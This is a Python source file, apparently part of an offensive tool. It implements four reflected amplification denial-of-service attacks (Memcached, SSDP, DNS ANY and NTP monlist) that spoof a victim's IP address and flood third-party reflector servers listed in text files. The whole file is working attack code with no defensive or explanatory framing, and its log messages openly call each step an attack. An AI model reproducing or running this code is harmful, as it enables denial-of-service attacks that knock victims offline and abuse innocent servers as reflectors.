import random
import time
import socket
import threading
from scapy.all import IP, UDP, DNS, DNSQR, Raw, send
from src.utils.logging import add_system_log
from src.security import stop_event

def memcached_amplification(target, duration, monitor=None):
    """Memcached UDP Amplification Attack (CVE-2018-1000115)"""
    port = 11211
    payload = b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
    
    servers = []
    try:
        with open('txt/memcached_servers.txt', 'r') as f:
            servers = [line.strip() for line in f if line.strip()]
    except:
        add_system_log("[red]ERROR:[/] memcached_servers.txt not found.")
        return

    add_system_log(f"[bold cyan]ATTACK:[/] Memcached flooding {target} via {len(servers)} servers")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        for server in servers:
            try:
                pkt = IP(src=target, dst=server) / UDP(sport=random.randint(1024, 65535), dport=port) / Raw(load=payload)
                send(pkt, verbose=False)
                if monitor: monitor.update_stats(packets=1, bytes_sent=len(pkt))
            except:
                continue

def ssdp_amplification(target, duration, monitor=None):
    """SSDP (Simple Service Discovery Protocol) Amplification"""
    port = 1900
    payload = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
    
    servers = []
    try:
        with open('txt/ssdp_servers.txt', 'r') as f:
            servers = [line.strip() for line in f if line.strip()]
    except:
        add_system_log("[red]ERROR:[/] ssdp_servers.txt not found.")
        return

    add_system_log(f"[bold cyan]ATTACK:[/] SSDP flooding {target} via {len(servers)} servers")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        for server in servers:
            try:
                pkt = IP(src=target, dst=server) / UDP(sport=random.randint(1024, 65535), dport=port) / Raw(load=payload)
                send(pkt, verbose=False)
                if monitor: monitor.update_stats(packets=1, bytes_sent=len(pkt))
            except:
                continue

def dns_amplification(target, duration, monitor=None):
    """DNS Amplification Attack using randomized ANY queries"""
    servers = []
    try:
        with open('txt/dns_servers.txt', 'r') as f:
            servers = [line.strip() for line in f if line.strip()]
    except:
        add_system_log("[red]ERROR:[/] dns_servers.txt not found.")
        return

    # List of common domains to randomize queries
    domains = ["google.com", "facebook.com", "youtube.com", "yahoo.com", "wikipedia.org"]

    add_system_log(f"[bold cyan]ATTACK:[/] DNS flooding {target} via {len(servers)} resolvers")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        for server in servers:
            try:
                domain = random.choice(domains)
                pkt = IP(src=target, dst=server) / UDP(sport=random.randint(1024, 65535), dport=53) / \
                      DNS(rd=1, qd=DNSQR(qname=domain, qtype="ANY"))
                send(pkt, verbose=False)
                if monitor: monitor.update_stats(packets=1, bytes_sent=len(pkt))
            except:
                continue

def ntp_amplification(target, duration, monitor=None):
    """NTP (Network Time Protocol) Amplification"""
    port = 123
    payload = b"\x17\x00\x03\x2a\x00\x00\x00\x00" + b"\x00" * 40
    
    servers = []
    try:
        with open('txt/ntp_servers.txt', 'r') as f:
            servers = [line.strip() for line in f if line.strip()]
    except:
        add_system_log("[red]ERROR:[/] ntp_servers.txt not found.")
        return

    add_system_log(f"[bold cyan]ATTACK:[/] NTP flooding {target} via {len(servers)} servers")
    end_time = time.time() + duration
    
    while time.time() < end_time:
        for server in servers:
            try:
                pkt = IP(src=target, dst=server) / UDP(sport=random.randint(1024, 65535), dport=port) / Raw(load=payload)
                send(pkt, verbose=False)
                if monitor: monitor.update_stats(packets=1, bytes_sent=len(pkt))
            except:
                continue
